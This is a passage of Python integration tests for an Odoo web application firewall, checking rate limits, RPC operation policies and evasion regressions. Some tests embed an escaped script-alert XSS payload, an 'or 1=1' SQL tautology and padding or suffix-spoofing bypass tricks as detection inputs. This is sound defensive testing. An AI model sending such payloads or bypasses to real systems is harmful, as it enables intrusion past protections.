            r = self.url_open(
                "/web/signup", data=urlencode({"login": "x@y.nl",
                                               "password": "nope-1"}),
                headers={"X-Real-IP": "203.0.113.59",
                         "Content-Type": "application/x-www-form-urlencoded"})
            self.assertEqual(r.status_code, 403,
                             "third excess crosses the shared limit of 2")
            hits = self._dbread(lambda env: env["waf.rate.hit"].search_count(
                [("network", "=", seed_key), ("hits", ">=", 3)]))
            self.assertTrue(hits, "counter row exists with the shared total")
            # in-place blocking with rate_block_minutes=0: no IP-wide entry
            self.assertFalse(self._dbread(lambda env: env["waf.ip.entry"].search_count(
                [("network", "=", "203.0.113.59/32")])))
        finally:
            self._policy("waf-ep-signup", **before)
            self._clear_net("203.0.113.59")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/web/signup")]).unlink())

    def test_60_legitimate_rpc_workflows_keep_working(self):
        # the whole protection layer must leave the normal surfaces alone:
        # login form, JSON-2 view API and the JSON-RPC root all still
        # answer through ODOO (their own status codes), never the WAF page.
        self.assertEqual(self.url_open("/web/login").status_code, 200)
        marker = "p=waf-t60-legit"
        r = self.url_open(
            f"/jsonrpc?{marker}",
            data=json.dumps({"jsonrpc": "2.0", "method": "call", "id": 7,
                             "params": {"service": "common",
                                        "method": "authenticate",
                                        "args": [self.env.cr.dbname,
                                                 "nope", "nope", {}]}}),
            headers={"Content-Type": "application/json"})
        self.assertNotEqual(r.status_code, 403)
        self.assertNotIn(b"OW Shield", r.content)
        r = self.url_open("/json/1/web")
        self.assertNotEqual(r.status_code, 403)
        self.assertNotIn(b"OW Shield", r.content)
        # and the /jsonrpc probes above were merely LOGGED by the
        # log-only built-ins -- visible, not refused
        # the protection layer watched: nothing was refused. (Which row
        # type wins the single-decision-per-request log depends on what
        # else matches -- the bundled scripted-client UA rule watches this
        # python-requests probe at the same visibility tier as the log-only
        # JSON-RPC built-in.) Endpoint-policy visibility itself is proven
        # by the db-service probes in test_52.
        rows = [x for x in self._hit_rows("/jsonrpc") if marker in x["query"]]
        self.assertTrue(rows and not any(x["blocked"] for x in rows),
                        "legitimate RPC must never be blocked: %r" % rows)

    # ---------------------------------------- round-12 review regressions

    def test_61_exception_on_one_rule_keeps_independent_block(self):
        # review 12-1 (end-to-end): an exception scoped to one rule may
        # only downgrade THAT rule -- a second, unrelated blocking rule
        # matching the same request must still refuse it. Custom markers
        # keep this fully deterministic (no bundled rule interference).
        ids = self._dbwrite(lambda env: [
            env["waf.rule"].create({
                "code": "waf-test-p1a", "name": "P1A stronger rule",
                "category": "test", "scope": "query",
                "pattern": "waf-p1a-marker", "action": "block",
                "severity": 5, "no_session": False}).id,
            env["waf.rule"].create({
                "code": "waf-test-p1b", "name": "P1B lower rule",
                "category": "test", "scope": "query",
                "pattern": "waf-p1b-marker", "action": "block",
                "severity": 4, "no_session": False}).id,
            env["waf.exception"].create({
                "name": "Scoped to P1A only",
                "rule_id": env["waf.rule"].search(
                    [("code", "=", "waf-test-p1a")]).id,
                "reason": "scoped test", "methods": "",
                "route_re": r"^/waf-p1coexist$"}).id,
        ])
        hdr = {"X-Real-IP": "203.0.113.61"}
        try:
            # BOTH rules match; only the STRONGER one (P1A) is excepted:
            # the request must still be refused via P1B (before the fix
            # the exception was applied to the merged decision and the
            # request passed).
            r = self.url_open("/waf-p1coexist"
                              "?x=waf-p1a-marker&y=waf-p1b-marker",
                              headers=hdr)
            self.assertEqual(r.status_code, 403,
                             "the exception must not silence P1B")
            rows = [x for x in self._hit_rows("/waf-p1coexist")
                    if "waf-p1b-marker" in x["query"]]
            self.assertTrue(rows and rows[-1]["blocked"])
            self.assertIn("P1B", rows[-1]["name"])
            self.assertNotIn("[excepted", rows[-1]["name"])
            # the exception still covers its own rule alone
            r = self.url_open("/waf-p1coexist?x=waf-p1a-marker",
                              headers=hdr)
            self.assertNotEqual(r.status_code, 403)
            rows = [x for x in self._hit_rows("/waf-p1coexist")
                    if x["query"] == "x=waf-p1a-marker"]
            self.assertTrue(rows, "the excepted match stays visible")
            self.assertIn("[excepted: scoped test]", rows[-1]["name"])
        finally:
            self._dbwrite(lambda env: (
                env["waf.exception"].browse(ids[2]).unlink(),
                env["waf.rule"].browse(ids[:2]).unlink(),
                env["waf.hit"].search(
                    [("path", "=", "/waf-p1coexist")]).unlink(),
            ))

    def test_62_monitoring_rate_policy_cannot_disable_block(self):
        # review 12-2 (end-to-end): a monitoring rate policy on the same
        # route as an unconditional block policy used to make that block
        # threshold-dependent -- the FIRST db-service request passed with
        # no block event at all. It must now be refused immediately, as a
        # visible event, while the monitoring counter still ticks.
        b_db = self._policy("waf-ep-jsonrpc-db", action="block")
        b_mon = self._policy("waf-ep-jsonrpc", action="log", rate_max=100)
        hdr = {"X-Real-IP": "203.0.113.62",
               "Content-Type": "application/json"}
        try:
            r = self.url_open("/jsonrpc", data=json.dumps(
                {"jsonrpc": "2.0", "method": "call", "id": 1,
                 "params": {"service": "db", "method": "list",
                            "args": []}}), headers=hdr)
            self.assertEqual(
                r.status_code, 403,
                "unconditional block stands below every rate threshold "
                "(this is the first request of the window)")
            rows = self._hit_rows("/jsonrpc")
            blocked = [x for x in rows if x["blocked"]]
            self.assertTrue(blocked, "the refusal must be a visible event")
            self.assertEqual(blocked[0]["kind"], "endpoint")
            counted = self._dbread(lambda env: env["waf.rate.hit"]
                                   .search_count([("network", "like",
                                                   "%203.0.113.62")]))
            self.assertTrue(counted,
                            "the monitoring counter still ticks")
        finally:
            self._policy("waf-ep-jsonrpc-db", **b_db)
            self._policy("waf-ep-jsonrpc", **b_mon)
            self._clear_net("203.0.113.62")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/jsonrpc")]).unlink())

    def test_63_call_kw_url_suffix_cannot_hide_the_body_operation(self):
        # review 12-3 (end-to-end): /web/dataset/call_kw/<model>.<method>
        # is COSMETIC -- Odoo dispatches the BODY's model/method. A
        # res.partner.read suffix wrapping a res.users/write body IS a
        # res.users/write request and must hit the operation policy;
        # the reversed decoy (scary suffix, harmless body) must NOT.
        pol_id = self._dbwrite(lambda env: env["waf.endpoint.policy"].create({
            "code": "waf-test-users-write", "name": "Test res.users write",
            "category": "test", "route_re": "^/web/dataset/",
            "methods": "POST", "rpc_model": "res.users",
            "rpc_method": "write", "action": "block", "severity": 4}).id)
        hdr = {"X-Real-IP": "203.0.113.63",
               "Content-Type": "application/json"}
        try:
            r = self.url_open(
                "/web/dataset/call_kw/res.partner.read",
                data=json.dumps({"jsonrpc": "2.0", "method": "call",
                                 "id": 1, "params": {
                                     "model": "res.users", "method": "write",
                                     "args": [[1],
                                              {"password": "x-secret-9"}],
                                     "kwargs": {}}}),
                headers=hdr)
            self.assertEqual(r.status_code, 403,
                             "the BODY operation decides, not the suffix")
            rows = self._hit_rows("/web/dataset/call_kw/res.partner.read")
            self.assertTrue(rows and any(x["blocked"] for x in rows))
            joined = " ".join(x["name"] + " " + x["query"] for x in rows)
            self.assertNotIn("x-secret-9", joined,
                             "body values never enter the traffic log")
            # reversed decoy: harmless body, intimidating suffix -> the
            # policy must NOT fire (the suffix does not restrict anything,
            # it must not frame the request either)
            r = self.url_open(
                "/web/dataset/call_kw/res.users.write",
                data=json.dumps({"jsonrpc": "2.0", "method": "call",
                                 "id": 2, "params": {
                                     "model": "res.partner",
                                     "method": "read", "args": [[1]],
                                     "kwargs": {}}}),
                headers=hdr)
            self.assertNotEqual(r.status_code, 403)
            self.assertNotIn(b"OW Shield", r.content)
            # same story on call_button (also body-dispatched)
            r = self.url_open(
                "/web/dataset/call_button/res.partner.read",
                data=json.dumps({"jsonrpc": "2.0", "method": "call",
                                 "id": 3, "params": {
                                     "model": "res.users", "method": "write",
                                     "args": [[1], {"active": False}],
                                     "kwargs": {}}}),
                headers=hdr)
            self.assertEqual(r.status_code, 403)
            # suffix as informational fallback ONLY: a body that says
            # nothing about the operation lets the suffix name it (Odoo
            # itself would reject such a call anyway)
            r = self.url_open(
                "/web/dataset/call_kw/res.users.write",
                data=json.dumps({"jsonrpc": "2.0", "method": "call",
                                 "id": 4, "params": {}}),
                headers=hdr)
            self.assertEqual(r.status_code, 403)
        finally:
            self._dbwrite(lambda env: (
                env["waf.endpoint.policy"].browse(pol_id).unlink(),
                env["waf.hit"].search([("path", "=like",
                                        "/web/dataset/%")]).unlink(),
            ))

    def test_64_form_body_wins_over_query_string_for_counters(self):
        # review 12-3 (second half): odoo's get_http_params() is
        # {**query, **form, **files} -- the FORM body decides the login a
        # reset targets. A "?login=..." query decoy must not move the
        # target the WAF counts (before the fix the query won, so these
        # three requests piled onto the decoy's counter and the third
        # crossed a limit of 2).
        pol_id = self._dbwrite(lambda env: env["waf.endpoint.policy"].create({
            "code": "waf-test-reset-tgt", "name": "Test reset target limit",
            "category": "test", "route_re": "^/web/reset_password$",
            "methods": "POST", "action": "block", "severity": 4,
            "rate_max": 2, "rate_window": 10, "rate_key": "target",
            "rate_param": "login", "rate_block_minutes": 0}).id)
        self._clear_net("203.0.113.64")
        hdr = {"X-Real-IP": "203.0.113.64",
               "Content-Type": "application/x-www-form-urlencoded"}
        try:
            for i in range(3):
                r = self.url_open(
                    "/web/reset_password?login=shared-decoy@example.nl",
                    data=urlencode({"login": "form-target-%d@example.nl" % i}),
                    headers=hdr)
                self.assertNotEqual(
                    r.status_code, 403,
                    "each request counts against its FORM target (1 of 2 "
                    "each), not against the query decoy (3 of 2)")

            def _digest(login):
                return hashlib.sha256(
                    ("login:" + login).encode()).hexdigest()[:24]

            keys = self._dbread(lambda env: [
                h.network for h in env["waf.rate.hit"].search(
                    [("network", "=like", "%t:login:%")])])
            for i in range(3):
                self.assertTrue(
                    any(_digest("form-target-%d@example.nl" % i) in k
                        for k in keys),
                    "the form target must be the counted one: %r" % keys)
            for k in keys:
                self.assertNotIn(
                    _digest("shared-decoy@example.nl"), k,
                    "the query decoy must not be counted when a form body "
                    "carries login")
        finally:
            self._dbwrite(lambda env: (
                env["waf.endpoint.policy"].browse(pol_id).unlink(),
                env["waf.hit"].search(
                    [("path", "=", "/web/reset_password")]).unlink(),
            ))
            self._clear_net("203.0.113.64")

    def test_65_rate_counters_do_not_blend_across_policies(self):
        # review 12-4 (end-to-end, bundled defaults): nine signup POSTs
        # plus two password resets from one address used to blend into a
        # single shared row -- the second reset was refused as "11 in 10
        # min" against the reset policy's limit of 10. Counters are per
        # policy now; the reset policy sees only its own two.
        hdr = {"X-Real-IP": "203.0.113.65",
               "Content-Type": "application/x-www-form-urlencoded"}
        signup = urlencode({"name": "Blend Bot",
                            "login": "blend.bot@example.nl",
                            "password": "secret-password-1",
                            "confirm_password": "secret-password-1"})
        reset = urlencode({"login": "blend.victim@example.nl"})
        self._clear_net("203.0.113.65")
        try:
            for _ in range(9):
                r = self.url_open("/web/signup", data=signup, headers=hdr)
                self.assertNotEqual(r.status_code, 403)
            for _ in range(2):
                r = self.url_open("/web/reset_password", data=reset,
                                  headers=hdr)
                self.assertNotEqual(
                    r.status_code, 403,
                    "2 of the RESET policy's 10 -- not 11 of 10 summed "
                    "across signup and reset policies")
            rows = self._dbread(lambda env: [
                h.network for h in env["waf.rate.hit"].search(
                    [("network", "like", "%203.0.113.65")])])
            ip_keys = sorted(k for k in rows if k.endswith("203.0.113.65"))
            self.assertEqual(len(ip_keys), 2,
                             "signup and reset each own one IP counter: %r"
                             % rows)
            for k in ip_keys:
                self.assertTrue(k.startswith("p"),
                                "counters are policy-namespaced: %r" % k)
            self.assertFalse(self._dbread(lambda env: env["waf.ip.entry"]
                                          .search_count([("network", "=",
                                                          "203.0.113.65/32")])))
        finally:
            self._clear_net("203.0.113.65")
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "in", ("/web/signup", "/web/reset_password"))]
            ).unlink())

    def test_66_oversized_jsonrpc_cannot_escape_service_policy(self):
        # review 12-5 (end-to-end): the reviewer's exact bypass class --
        # a valid db-service envelope padded past the capture cap. The
        # RPC envelope now parses up to 512 KiB (the regex scan cap
        # stays where the admin set it), and a body past even THAT is
        # operation-unverified: the db-service policy fails closed
        # (on_unverified=match) instead of handing out a free pass.
        b_db = self._policy("waf-ep-jsonrpc-db", action="block")
        hdr = {"X-Real-IP": "203.0.113.66",
               "Content-Type": "application/json"}
        middleware._overflow_seen.clear()

        def _padded(service, method, char, n):
            return ('{"jsonrpc":"2.0","method":"call","id":1,"params":'
                    '{"service":"%s","method":"%s","args":["pad'
                    % (service, method)
                    + char * n + '"]}}').encode()
        try:
            # 70 KB: past the 64 KiB signature-scan cap, far below the
            # parse cap -- parsed, service seen, refused.
            r = self.url_open("/jsonrpc", data=_padded("db", "list",
                                                       "x", 70000),
                              headers=hdr)
            self.assertEqual(
                r.status_code, 403,
                "padding past the scan cap can no longer hide the service")
            # 600 KB: past even the parse cap -- the operation cannot be
            # verified at all; the opted-in policy refuses rather than
            # treating "we could not look" as "allowed".
            r = self.url_open("/jsonrpc", data=_padded("db", "list",
                                                       "y", 600000),
                              headers=hdr)
            self.assertEqual(r.status_code, 403,
                             "operation unverifiable -> fail closed")
            # the documented fail-closed COST: a huge harmless-service
            # body on the same opted-in policy is refused too (the
            # padding is indistinguishable; admins tune per policy)
            r = self.url_open("/jsonrpc", data=_padded("object",
                                                       "execute_kw",
                                                       "w", 600000),
                              headers=hdr)
            self.assertEqual(r.status_code, 403, "documented cost")
            rows = self._hit_rows("/jsonrpc")
            self.assertTrue(any(x["kind"] == "endpoint" and x["blocked"]
                                for x in rows), rows)
            self.assertTrue(any(x["kind"] == "body" for x in rows),
                            "the signature layer's coverage note stays")
        finally:
            middleware._overflow_seen.clear()
            self._policy("waf-ep-jsonrpc-db", **b_db)
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/jsonrpc")]).unlink())

    def test_67_multipart_form_fields_are_the_counted_target(self):
        # parity with odoo's get_http_params(): MULTIPART form fields land
        # in request.params exactly like urlencoded ones, so a reset POST
        # split over multipart must count against its FORM target -- the
        # structured layer used to see nothing at all in such a body.
        pol_id = self._dbwrite(lambda env: env["waf.endpoint.policy"].create({
            "code": "waf-test-reset-mp", "name": "Test multipart target limit",
            "category": "test", "route_re": "^/web/reset_password$",
            "methods": "POST", "action": "block", "severity": 4,
            "rate_max": 2, "rate_window": 10, "rate_key": "target",
            "rate_param": "login", "rate_block_minutes": 0}).id)
        self._clear_net("203.0.113.67")
        boundary = "owshieldt67"
        hdr = {"X-Real-IP": "203.0.113.67",
               "Content-Type": "multipart/form-data; boundary=" + boundary}

        def _form(login):
            out = b""
            for name, value in (("login", login), ("csrf_token", "dummy")):
                out += (b"--" + boundary.encode() + b"\r\nContent-Disposition:"
                        b' form-data; name="' + name.encode() + b'"\r\n\r\n'
                        + value.encode() + b"\r\n")
            return out + b"--" + boundary.encode() + b"--\r\n"

        try:
            for i in range(3):
                r = self.url_open(
                    "/web/reset_password?login=shared-decoy@example.nl",
                    data=_form("mp-target-%d@example.nl" % i), headers=hdr)
                self.assertNotEqual(
                    r.status_code, 403,
                    "each multipart request counts against its own field "
                    "value (1 of 2), not the query decoy (3 of 2)")

            def _digest(login):
                return hashlib.sha256(
                    ("login:" + login).encode()).hexdigest()[:24]

            keys = self._dbread(lambda env: [
                h.network for h in env["waf.rate.hit"].search(
                    [("network", "=like", "%t:login:%")])])
            for i in range(3):
                self.assertTrue(
                    any(_digest("mp-target-%d@example.nl" % i) in k
                        for k in keys),
                    "the multipart field must be the counted target: %r"
                    % keys)
            for k in keys:
                self.assertNotIn(
                    _digest("shared-decoy@example.nl"), k,
                    "the query decoy must not be counted when the multipart "
                    "body carries login")
        finally:
            self._clear_net("203.0.113.67")
            self._dbwrite(lambda env: (
                env["waf.endpoint.policy"].browse(pol_id).unlink(),
                env["waf.hit"].search(
                    [("path", "=", "/web/reset_password")]).unlink(),
            ))

    # ------------------------------------- round 13: capture width, verdict
    # ------------------------------------- independence, parser parity

    def test_68_escaped_signature_in_padded_rpc_body_is_still_caught(self):
        # review 13-F01: widening the RPC capture (512 KiB, for the
        # policy layer) must not narrow what the SIGNATURE rules see.
        # The reviewer's pair: one escaped <script> payload, alone and
        # padded with 70 KB of benign text. Both must be refused by the
        # bundled body XSS rule -- before the fix the padded one passed,
        # because the decoded parity candidate was one string cut at the
        # scan cap and the padding the walk visited first ate the budget.
        esc = b'"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"'
        small = (b'{"jsonrpc":"2.0","method":"call","params":'
                 b'{"model":"waf.test.no.such","method":"name_create",'
                 b'"args":[' + esc + b'],"kwargs":{}},"id":1}')
        variants = (
            ("inline", small),
            # padding AFTER the payload in the document (walked first)
            ("pad-after", small[:-1] + b',"padding":"' + b"a" * 70000 + b'"}'),
            # padding BEFORE it -- the ordering must not matter either
            ("pad-before", (
                b'{"jsonrpc":"2.0","padding":"' + b"a" * 70000 + b'","params":'
                b'{"model":"waf.test.no.such","method":"name_create","args":['
                + esc + b'],"kwargs":{}},"id":1}')),
        )
        hdr = {"X-Real-IP": "203.0.113.68",
               "Content-Type": "application/json"}
        middleware._overflow_seen.clear()
        try:
            for label, body in variants:
                self.assertLess(len(body), 65536 + 6000,
                                "the payload stays inside the raw scan "
                                "window: this is about the decoded walk")
                r = self.url_open("/web/dataset/call_kw?waf-t68=" + label,
                                  data=body, headers=hdr)
                self.assertEqual(r.status_code, 403,
                                 "%s: the escaped payload must be refused"
                                 % label)
                self.assertIn(b"OW Shield", r.content, label)
            rows = self._hit_rows("/web/dataset/call_kw")
            for label, body in variants:
                mine = [x for x in rows
                        if x["query"] == "waf-t68=" + label and x["blocked"]]
                self.assertTrue(mine, "%s: no blocked hit logged: %r"
                                % (label, rows))
                self.assertTrue(any("script" in x["name"].lower()
                                    for x in mine),
                                "%s: not the body XSS rule: %r" % (label,
                                                                   mine))
            # replay integrity: the captured bytes must still reach the
            # app whole. A 120 KB JSON-RPC envelope (past the scan cap)
            # gets Odoo's own answer, not its "I could not parse this"
            # answer -- so the replay stream is intact.
            r = self.url_open(
                "/jsonrpc",
                data=(b'{"jsonrpc":"2.0","method":"call","id":9,"params":'
                      b'{"service":"common","method":"version","args":[],'
                      b'"padding":"' + b"a" * 120000 + b'"}}'),
                headers=hdr)
            self.assertNotEqual(r.status_code, 403,
                                "an oversized legitimate envelope is not "
                                "the WAF's business")
            self.assertNotIn(b"OW Shield", r.content)
            self.assertNotIn(b"Invalid JSON data", r.content,
                             "the body reached Odoo complete (a truncated "
                             "replay would fail Odoo's json.loads)")
        finally:
            middleware._overflow_seen.clear()
            middleware.flush_hits()          # delete AFTER the flush
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=like", "/web/dataset/%")]).unlink())

    def test_69_learning_mode_logs_it_without_blocking(self):
        # same evasion shape, learning mode: the match must still show up
        # in the traffic log -- logging is the whole point of learning --
        # without refusing anything.
        esc = b'"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"'
        body = (b'{"jsonrpc":"2.0","method":"call","params":{"model":'
                b'"waf.test.no.such","method":"name_create","args":[' + esc
                + b'],"kwargs":{}},"id":1')
        body = body + b',"padding":"' + b"a" * 70000 + b'"}'
        hdr = {"X-Real-IP": "203.0.113.681",
               "Content-Type": "application/json"}
        self._dbwrite(lambda env: env["waf.config"].get_singleton().write(
            {"mode": "learning"}))
        try:
            r = self.url_open("/web/dataset/call_kw?waf-t69=learn",
                              data=body, headers=hdr)
            self.assertNotEqual(r.status_code, 403,
                                "learning mode never blocks")
            self.assertNotIn(b"OW Shield", r.content)
            rows = [x for x in self._hit_rows("/web/dataset/call_kw")
                    if x["query"] == "waf-t69=learn"]
            self.assertTrue(rows, "learning must still record the match")
            self.assertTrue(any("script" in x["name"].lower()
                                and not x["blocked"] for x in rows),
                            "the padded XSS match must be visible: %r" % rows)
        finally:
            middleware.flush_hits()          # delete AFTER the flush
            self._dbwrite(lambda env: (
                env["waf.config"].get_singleton().write({"mode": "enforce"}),
                env["waf.hit"].search(
                    [("path", "=like", "/web/dataset/%")]).unlink(),
            ))

    def test_70_flood_policy_severity_cannot_cancel_a_signature_block(self):
        # review 13-F02 (end-to-end): the bundled password-reset flood
        # policy raised to severity 5 -- above the severity-4 SQL
        # tautology rule -- used to BECOME the decision, and because its
        # counter sits at 1 of 10 the middleware allowed the request:
        # the signature's independent block was cancelled by a policy
        # that had not decided anything yet.
        before = self._policy("waf-ep-reset-ip", severity=5)
        pol_id = self._dbread(lambda env: env["waf.endpoint.policy"].search(
            [("code", "=", "waf-ep-reset-ip")]).id)
        self._clear_net("203.0.113.70")
        hdr = {"X-Real-IP": "203.0.113.70",
               "Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = self.url_open("/web/reset_password?x=waf-t70",
                              data="login=or+1=1", headers=hdr)
            self.assertEqual(
                r.status_code, 403,
                "a below-threshold flood policy must not cancel the "
                "signature's block")
            self.assertIn(b"OW Shield", r.content)
            rows = [x for x in self._hit_rows("/web/reset_password")
                    if x["query"] == "x=waf-t70"]
            blocked = [x for x in rows if x["blocked"]]
            self.assertTrue(blocked, "the block must be logged: %r" % rows)
            self.assertTrue(any("tautology" in x["name"].lower()
                                for x in blocked),
                            "the signature is what refused it: %r" % blocked)
            # ... and the flood counter still ticked: the attack is also
            # a reset request, the two ledgers stay independent
            keys = self._dbread(lambda env: [
                h.network for h in env["waf.rate.hit"].search(
                    [("network", "like", "%203.0.113.70")])])
            self.assertEqual(
                keys, ["p%d:203.0.113.70" % pol_id],
                "the policy's counter counted the refused request once")

            # the ordinary behaviour around it must be untouched: benign
            # traffic below the limit keeps flowing, and the limit itself
            # still refuses when IT is what is crossed
            for _ in range(3):
                r = self.url_open("/web/reset_password",
                                  data="login=victim-t70@example.nl",
                                  headers=hdr)
                self.assertNotEqual(r.status_code, 403,
                                    "benign resets stay allowed")
        finally:
            self._policy("waf-ep-reset-ip", **before)
            self._clear_net("203.0.113.70")
            middleware.flush_hits()          # delete AFTER the flush
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("path", "=", "/web/reset_password")]).unlink())

    def test_71_duplicate_multipart_login_fields_count_one_target(self):
        # review 13-F03: a multipart body with TWO fields named login.
        # Werkzeug hands the controller the FIRST value, so all three
        # requests target the same account; the WAF concatenated the two
        # values, invented a fresh counter key per request, and a limit
        # of two was never reached.
        pol_id = self._dbwrite(lambda env: env["waf.endpoint.policy"].create({
            "code": "waf-test-reset-dup", "name": "Test duplicate-field limit",
            "category": "test", "route_re": "^/web/reset_password$",
            "methods": "POST", "action": "block", "severity": 4,
            "rate_max": 2, "rate_window": 10, "rate_key": "target",
            "rate_param": "login", "rate_block_minutes": 0}).id)
        self._clear_net("203.0.113.71")
        boundary = "owshieldt71"
        hdr = {"X-Real-IP": "203.0.113.71",
               "Content-Type": "multipart/form-data; boundary=" + boundary}

        def _form(name_values):
            out = b""
            for name, value in name_values:
                out += (b"--" + boundary.encode() + b"\r\nContent-Disposition:"
                        b' form-data; name="' + name.encode() + b'"\r\n\r\n'
                        + value.encode() + b"\r\n")
            return out + b"--" + boundary.encode() + b"--\r\n"

        target = "dup.victim-t71@example.nl"

        def _digest(value):
            return hashlib.sha256(("login:" + value).encode()).hexdigest()[:24]

        try:
            def _keys():
                # every target-keyed counter row, whoever wrote it: the
                # bundled per-account reset policy keeps its own row next
                # to this test's policy (counters are namespaced per
                # policy since round 12)
                return self._dbread(lambda env: [
                    h.network for h in env["waf.rate.hit"].search(
                        [("network", "like", "%t:login:%")])])

            def _mine():
                return [k for k in _keys() if k.startswith("p%d:" % pol_id)]

            for i in (0, 1):
                r = self.url_open("/web/reset_password",
                                  data=_form([("login", target),
                                              ("login", str(i)),
                                              ("csrf_token", "dummy")]),
                                  headers=hdr)
                self.assertNotEqual(r.status_code, 403,
                                    "reset %d of 2 against ONE target"
                                    % (i + 1))
            keys = _keys()
            self.assertEqual(
                _mine(), ["p%d:t:login:%s" % (pol_id, _digest(target))],
                "exactly one counter, for the account the controller "
                "reads: %r" % keys)
            self.assertNotIn(
                _digest(target + "0"), "".join(keys),
                "the joined duplicate must not define a target: %r" % keys)
            r = self.url_open("/web/reset_password",
                              data=_form([("login", target),
                                          ("login", "2"),
                                          ("csrf_token", "dummy")]),
                              headers=hdr)
            self.assertEqual(
                r.status_code, 403,
                "the third reset of the SAME account crosses the limit")
            self.assertIn(b"OW Shield", r.content)
            self.assertEqual(_mine(), ["p%d:t:login:%s" % (pol_id,
                                                           _digest(target))],
                             "still exactly one counter for the target")

            # an EMPTY first field is what the app sees (werkzeug keeps
            # it): nobody is targeted, so nobody may be counted -- in
            # particular not whoever the query string names.
            r = self.url_open(
                "/web/reset_password?login=framed.victim-t71@example.nl",
                data=_form([("login", ""), ("login", target),
                            ("csrf_token", "dummy")]),
                headers=hdr)
            self.assertNotEqual(r.status_code, 403,
                                "an empty login targets nothing -- and the "
                                "body's field, empty or not, outranks the "
                                "query string")
            keys = _keys()
            self.assertNotIn(
                _digest("framed.victim-t71@example.nl"),
                "".join(keys),
                "the query decoy must not be counted behind an empty field")
        finally:
            self._clear_net("203.0.113.71")
            middleware.flush_hits()          # delete AFTER the flush
            self._dbwrite(lambda env: (
                env["waf.endpoint.policy"].browse(pol_id).unlink(),
                env["waf.hit"].search(
                    [("path", "=", "/web/reset_password")]).unlink(),
            ))


    def test_72_multipart_extractor_keeps_the_first_value_whole(self):
        # review 13-F03, extractor level. Werkzeug hands our decoder the
        # whole captured prefix in one go, so one field part arrives as a
        # single Data event -- but a capture cut mid-body still delivers
        # only part of a value, and a duplicate part must never top it up.
        # Pin both halves of the parity rule: everything the FIRST
        # occurrence delivered IS the value, and nothing a later
        # occurrence delivers is.
        bnd = "owshieldt72"
        ct = "multipart/form-data; boundary=" + bnd

        def _body(parts):
            out = ""
            for name, value in parts:
                out += ("--" + bnd + "\r\nContent-Disposition: form-data; "
                        'name="' + name + '"\r\n\r\n' + value + "\r\n")
            return out + "--" + bnd + "--\r\n"

        parts = [("login", "t" * 400), ("login", "second")]
        body = _body(parts).encode()

        # the first value survives a capture that ends inside it
        cut = body[:body.index(b"t" * 400) + 120]
        got = middleware._multipart_fields(cut, ct)
        self.assertEqual(got, {"login": "t" * 80},
                         "the partial first value is kept, capped at 80")

        # the first value complete, the duplicate truncated: still no
        # contribution from the second part
        cut = body[:body.index(b"second")]
        got = middleware._multipart_fields(cut, ct)
        self.assertEqual(got, {"login": "t" * 80})

        # the ordinary duplicate: first part wins, whole
        got = middleware._multipart_fields(body, ct)
        self.assertEqual(got, {"login": "t" * 80},
                         "never joined, never replaced: %r" % got)

    # ------------------------------------------------ round 16 regressions

    def _race_shared_counter(self, table, model, net):
        # review round 16 F01: the counter bump used to be an
        # ON CONFLICT DO UPDATE on the pool's REPEATABLE READ
        # transactions -- concurrent bumps of ONE network aborted with
        # 40001 and the except-branch silently dropped the hit (8
        # threads x 10 bumps lost 63-70 of 80 on the rig: attack/login
        # lockouts fell back to per-worker deques, rate limits failed
        # open). The bump is now the masterbp UPDATE-first shape at
        # READ COMMITTED: no call may fail, and all 80 hits must land,
        # each shared count handed out exactly once.
        dbname = self.env.cr.dbname
        self._dbwrite(lambda env: env[model].search(
            [("network", "=", net)]).unlink())
        res, barrier = [], threading.Barrier(8)

        def work():
            barrier.wait()
            for _ in range(10):
                res.append(middleware._bump_lockout(dbname, net, 600,
                                                    table=table))

        threads = [threading.Thread(target=work) for _ in range(8)]
        try:
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            self.assertEqual(len(res), 80)
            self.assertFalse([r for r in res if r is None],
                             "%s: no bump may be dropped" % table)
            self.assertEqual(sorted(res), list(range(1, 81)),
                             "%s: shared counts 1..80 exactly once" % table)
            self.assertEqual(self._dbread(lambda env: [
                rec.hits for rec in env[model].search(
                    [("network", "=", net)])]), [80],
                "%s: the stored row carries every credited hit" % table)
        finally:
            self._dbwrite(lambda env: env[model].search(
                [("network", "=", net)]).unlink())

    def test_73_attack_counter_race_keeps_every_hit(self):
        self._race_shared_counter("waf_lockout_hit", "waf.lockout.hit",
                                  "198.51.100.81/32")

    def test_74_login_counter_race_keeps_every_hit(self):
        self._race_shared_counter("waf_login_hit", "waf.login.hit",
                                  "198.51.100.82/32")

    def test_75_rate_counter_race_keeps_every_hit(self):
        self._race_shared_counter("waf_rate_hit", "waf.rate.hit",
                                  "198.51.100.83/32")

    def test_76_login_lockout_never_fires_in_learning(self):
        # review round 16 F02: the login counter ignored waf.config.mode
        # -- in Learning, login_fail_max failures created an active
        # source='auto' deny entry, and kind=="ip" entries bite in EVERY
        # mode: the whole site answered 403 (dangerous on top of a
        # misconfigured trusted_proxies, where every client shares the
        # proxy network). Learning must only NOTE the would-be lockout
        # in the traffic log -- no entry, no shared row, site reachable.
        # Driven over the real JSON-RPC login route with the DEFAULT
        # login_fail_max (10): the request env can hold a stale RR
        # snapshot predating any _dbwrite (test_08's note), and 10 is
        # that default in every snapshot generation -- so the threshold
        # is the one thing that IS stable across the split.
        ip = "198.51.100.91"  # fresh: no stale deque from earlier tests
        net = ip + "/32"
        self._dbwrite(lambda env: env["waf.config"].get_singleton()
                      .write({"mode": "learning"}))
        try:
            for i in range(11):
                self._login_attempt(ip, "waf-brute-u76", "nope-%d" % i)
            middleware.flush_hits()
            entries, rows, notes = self._dbread(lambda env: (
                env["waf.ip.entry"].search_count([
                    ("network", "=", net), ("source", "=", "auto")]),
                env["waf.login.hit"].search_count(
                    [("network", "=", net)]),
                [(h.kind, h.action, h.blocked, h.category, h.rule_name,
                  h.mode) for h in env["waf.hit"].search(
                      [("ip", "=", ip), ("category", "=", "login")])]))
            self.assertEqual(entries, 0,
                             "Learning must never create a deny entry")
            self.assertEqual(rows, 0,
                             "Learning never writes the shared table")
            self.assertEqual(notes, [("ip", "log", False, "login",
                                      "login brute-force: would lock out "
